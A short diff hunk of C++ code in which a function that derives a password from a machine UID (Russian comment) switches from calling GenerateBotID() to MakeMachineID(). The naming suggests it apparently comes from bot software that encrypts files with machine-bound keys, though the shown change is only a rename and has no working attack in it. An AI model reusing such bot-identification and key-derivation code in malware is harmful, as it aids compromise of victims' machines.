@@ -624,7 +624,7 @@ LPVOID CryptFile::ReadToBuffer(PCHAR FileName, LPDWORD BufferSize, PCHAR Passwor
 PCHAR UIDCrypt::GeneratePassword()
 {
 	//Функция генерирует пароль на основе UID
-	PCHAR UID = GenerateBotID();
+	PCHAR UID = MakeMachineID();
 	if (UID == NULL)
 		return NULL;
 
